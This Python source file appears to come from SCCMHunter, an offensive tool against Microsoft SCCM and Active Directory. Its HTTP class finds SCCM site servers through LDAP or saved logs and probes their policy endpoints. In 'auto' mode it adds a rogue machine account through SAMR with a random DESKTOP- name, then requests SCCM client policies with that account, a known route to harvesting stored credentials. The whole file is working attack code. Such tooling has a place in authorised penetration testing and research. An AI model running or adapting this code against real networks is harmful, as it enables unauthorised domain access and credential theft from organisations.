from lib.ldap import init_ldap_session
from lib.logger import console, logger, init_logger
from lib.attacks.find import SCCMHUNTER
from lib.scripts.addcomputer import AddComputerSAMR
from lib.scripts.sccmwtf import SCCMTools
from lib.scripts.banner import show_banner
import requests
import getpass
import random
import string
import ldap3
import sys
import os



class HTTP:
    
    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
                    dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
                    aes=None, debug=False, auto=False, computer_pass=None, computer_name=None,
                    logs_dir=None):
        self.username = username
        self.password = password
        self.domain = domain
        self.target_dom = target_dom
        self.dc_ip = dc_ip
        self.ldaps = ldaps
        self.kerberos = kerberos
        self.no_pass = no_pass
        self.hashes=hashes
        self.aes = aes
        self.debug = debug
        self.ldap_session = None
        self.search_base = None
        self.auto = auto
        self.computer_name = computer_name
        self.computer_pass = computer_pass
        self.targets = []
        self.logs_dir = logs_dir

 
    def run(self):
        logfile = f"{os.path.expanduser('~')}/.sccmhunter/logs/sccmhunter.log"
        if os.path.exists(logfile):
            logger.info("[*] Found targets from logfile.")
            targets = self.read_logs(logfile)
            self.targets = self.http_hunter(targets)
            self.autopwn()
        else:
            logger.info("Log file not found, searching LDAP for site servers.")
            sccmhunter = SCCMHUNTER(username=self.username, password=self.password, domain=self.domain, 
                                    target_dom=self.target_dom, dc_ip=self.dc_ip,ldaps=self.ldaps,
                                    kerberos=self.kerberos, no_pass=self.no_pass, hashes=self.hashes, 
                                    aes=self.aes, debug=self.debug, logs_dir=self.logs_dir)
            sccmhunter.run()
            self.run()


    def autopwn(self):
        if self.auto:
            if not (self.username or self.password):
                logger.info("Missing user credentials, check your arguments and try again.")
                sys.exit()
            logger.info("[*] User selected auto. Attempting to add a machine account then request policies."
                        )
            self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
            self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
                                   self.dc_ip, self.computer_name, self.computer_pass)
            samradd.run()

            if self.validate_add(self.computer_name):
                logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
            else:
                logger.info(f'[-] Could not validate successful creation.')
        
        if not (self.computer_name or self.computer_pass):
            logger.info("[-] Missing machine account credentials, check your arguments and try again.")
            sys.exit()

        for target in self.targets:
            target_name = self.computer_name[:-1]
            target_fqdn = f'{target_name}.{self.domain}'
            try:
                logger.info(f"[*] Atempting to grab policy from {target}")
                SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.logs_dir)
                SCCMWTF.sccmwtf_run()
            except Exception as e:
                print(e)

    def read_logs(self, logfile):
        targets = []
        with open(f"{logfile}", "r") as f:
            for line in f.readlines():
                targets.append(line.strip())
        return targets
    

    def http_hunter(self, servers):
        validated = []                   
        for server in servers:
            url=(f"http://{server}/ccm_system_windowsauth")
            url2=(f"http://{server}/ccm_system/")
            try:
                x = requests.get(url, timeout=5)
                x2 = requests.get(url2,timeout=5)
                if x.status_code == 401:
                    logger.info(f"[+] Found {url}")
                    validated.append(server)
                if x2.status_code == 403:
                    logger.info(f"[+] Found {url2}")
                    validated.append(server)
            except requests.exceptions.Timeout:
                logger.info(f"[-] {server} connection timed out.")
            except requests.ConnectionError as e:
                logger.info(f"[-] {server} doesn't appear to be a SCCM server.")
                pass
        if validated:
            return validated
        else:
            print("[-] No HTTP endpoints found :(")


    def validate_add(self, computername):
        lmhash = ""
        nthash = ""
        
        if self.hashes:
            lmhash, nthash = self.hashes.split(':')
        if not (self.password or self.hashes or self.aes or self.no_pass):
                self.password = getpass("Password:")

        # set search base to query
        if self.target_dom:
            self.search_base = self.get_dn(self.target_dom)
        else:
            self.search_base = self.get_dn(self.domain)

        try:
            ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password,
                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
                                                           aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
            logger.debug(f'[+] Bind successful {ldap_server}')
            try:
                controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
                self.ldap_session.extend.standard.paged_search(self.search_base, 
                                                               search_filter=f"(samaccountname={computername})", 
                                                               attributes="nTSecurityDescriptor", 
                                                               generator=False)
                return True
            except ldap3.core.exceptions.LDAPAttributeError as e:
                print()
                logger.info(f'[-] Error: {str(e)}')
                return False

        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
            if 'invalid server address' in str(e):
                logger.info(f'[-] Invalid server address - {self.domain}')
            else:
                logger.info('[-] Error connecting to LDAP server')
                print()
                logger.info(e)
            return False
        except ldap3.core.exceptions.LDAPBindError as e:
            logger.info(f'[-] Error: {str(e)}')
            return False
        

    def get_dn(self, domain):
        components = domain.split('.')
        base = ''
        for comp in components:
            base += f',DC={comp}'
        
        return base[1:]
